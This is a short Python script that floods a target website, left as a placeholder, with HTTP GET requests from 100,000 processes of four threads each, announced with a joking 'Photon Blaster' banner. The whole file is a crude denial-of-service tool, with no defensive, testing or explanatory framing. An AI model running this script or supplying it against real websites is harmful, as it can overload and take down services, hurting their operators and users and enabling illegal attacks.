import requests, threading
from multiprocessing import Process

number_procs = 100000
number_threads = 4
webserver = "insert website here"

class RequestThread(threading.Thread):
    def run(self):
        requests.get(f"https://{webserver}/")

def request(number_threads):
    threads = []
    for i in range(number_threads):
        t = RequestThread()
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == '__main__':
    procs = []
    print(f"Firing The Photon Blaster: Powerlevel {number_procs} - {number_threads}!!!")
    for i in range(number_procs):
        p = Process(target=request, args=(number_threads,))
        p.start()
        procs.append(p)
    for p in procs:
        p.join()
    print("Launch Complete...")
